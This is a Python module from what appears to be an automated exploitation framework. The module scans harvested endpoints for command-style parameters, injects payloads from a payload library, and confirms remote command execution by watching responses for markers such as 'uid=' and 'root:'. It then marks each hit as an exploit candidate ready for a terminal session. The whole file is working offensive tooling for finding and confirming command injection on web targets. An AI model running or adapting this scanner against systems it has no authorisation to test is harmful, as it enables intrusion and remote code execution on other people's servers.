from __future__ import annotations
from urllib.parse import parse_qsl,urlsplit,urlencode,urlunsplit
from core.module import ExploitModule
from core.models import ExploitResult, Artifact
from core.payloads import get_payloads

class RCEModule(ExploitModule):
    name = "Command Injection / RCE"
    category = "execution"
    PARAMS={"cmd","command","exec","execute","query","q","host","ping","input"}

    @staticmethod
    def _execution_delta(before: str, after: str) -> bool:
        b=(before or "").lower(); a=(after or "").lower()
        markers=("uid=", "gid=", "groups=", "root:", "command not found", "windows\\system32", "volume serial number", "localhost")
        return any(m in a and m not in b for m in markers)

    async def run(self,ctx):
        evidence=[]; probes=get_payloads(self.name)
        for endpoint in ctx.artifacts.get("recon.endpoints",[])[:50]:
            parsed=urlsplit(endpoint); params=parse_qsl(parsed.query,keep_blank_values=True)
            candidates=[(i,n,v) for i,(n,v) in enumerate(params) if n.lower() in self.PARAMS]
            for idx,name,original in candidates:
                try:
                    baseline=await ctx.http.request("GET",endpoint)
                except Exception as exc:
                    evidence.append(f"baseline {endpoint} -> {exc}"); continue
                for i,payload in enumerate(probes,1):
                    ctx.logger(f"[payload {i}/{len(probes)}] Command Injection / RCE: {payload}")
                    mutated=params.copy(); mutated[idx]=(name,payload)
                    probe=urlunsplit((parsed.scheme,parsed.netloc,parsed.path,urlencode(mutated),parsed.fragment))
                    try:
                        r=await ctx.http.request("GET",probe)
                        delta=self._execution_delta(baseline.text,r.text)
                        evidence.append(f"{probe} -> {r.status_code}, {len(r.text)} bytes")
                        if delta:
                            finding={"url":probe,"payload":payload,"vulnerability":self.name,"response":f"HTTP {r.status_code}, {len(r.text)} bytes","confirmed":True,"terminal_ready":True}
                            ctx.add_finding(probe, payload, self.name, f"HTTP {r.status_code}, execution marker observed", confidence="high", terminal_ready=True)
                            ctx.logger(f"[VULN] {self.name} confirmed: {probe}")
                            ctx.logger("[terminal] exploit candidate ready; no flag scanning; continuing remaining RCE probes")
                            ctx.artifacts.set("execution.rce", finding)
                    except Exception as exc:
                        evidence.append(f"{probe} -> {exc}")
        return ExploitResult(self.name,"success" if ctx.artifacts.get("execution.rce") else ("signal" if evidence else "no-signal"),"Command-injection probes completed; all payloads tested",evidence="\n".join(evidence[:30]))
